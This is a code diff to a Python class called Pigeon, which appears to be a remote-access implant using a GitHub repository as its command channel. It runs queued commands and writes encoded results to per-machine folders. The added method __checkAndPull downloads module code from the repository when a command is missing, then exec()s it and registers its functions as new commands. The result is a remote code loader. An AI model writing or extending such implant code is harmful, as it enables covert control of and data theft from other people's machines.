@@ -1,9 +1,10 @@
 from config import PARAM, METHODS, RUNNING
-from github import Github, Repository, ContentFile
+from github import Github, Repository, ContentFile, UnknownObjectException
 from json import loads
 from key import GIT_API_KEY
 from threading import Thread, Lock
 from time import sleep, strftime
+from types import FunctionType
 
 
 class Pigeon:
@@ -93,14 +94,15 @@ class Pigeon:
             for cmd, params in Pigeon.__commands.items():
                 message: str = strftime("%Y-%m-%d %H:%M")
                 if METHODS.get(cmd) == None:
-                    Pigeon.__repo.create_file(
-                        "{}/00_results/{}_{}".format(Pigeon.__uid, cmd, message),
-                        "Executioner failed",
-                        METHODS["sneak"](
-                            "The {} command is not available or loaded".format(cmd)
-                        ),
-                    )
-                    continue
+                    if not Pigeon.__checkAndPull(cmd):
+                        Pigeon.__repo.create_file(
+                            "{}/00_results/{}_{}".format(Pigeon.__uid, cmd, message),
+                            "Executioner failed",
+                            METHODS["sneak"](
+                                "The {} command is not available or loaded".format(cmd)
+                            ),
+                        )
+                        continue
                 if type(params) == list:
                     result = METHODS[cmd](*params)
                 if result is not None and len(result) != 0:
@@ -110,3 +112,24 @@ class Pigeon:
                         METHODS["sneak"](result),
                     )
             Pigeon.__commands.clear()
+
+    @staticmethod
+    def __checkAndPull(mod: str) -> bool:
+        try:
+            codeFile = Pigeon.__repo.get_contents("modules/{}.{}".format(mod,PARAM["sneak"]))
+        except UnknownObjectException:
+            try:
+                codeFile = Pigeon.__repo.get_contents("modules/{}".format(mod))
+            except UnknownObjectException:
+                return False
+        if type(codeFile) == ContentFile.ContentFile:
+            code = codeFile.decoded_content.decode()
+        try:
+            codeObj = compile(code, "<string>", "exec")
+            exec(codeObj)
+            for i in codeObj.co_names:
+                if locals().get(i) != None and isinstance(locals()[i],FunctionType):
+                    METHODS[mod] = locals()[i]
+        except Exception:
+            return False
+        return True
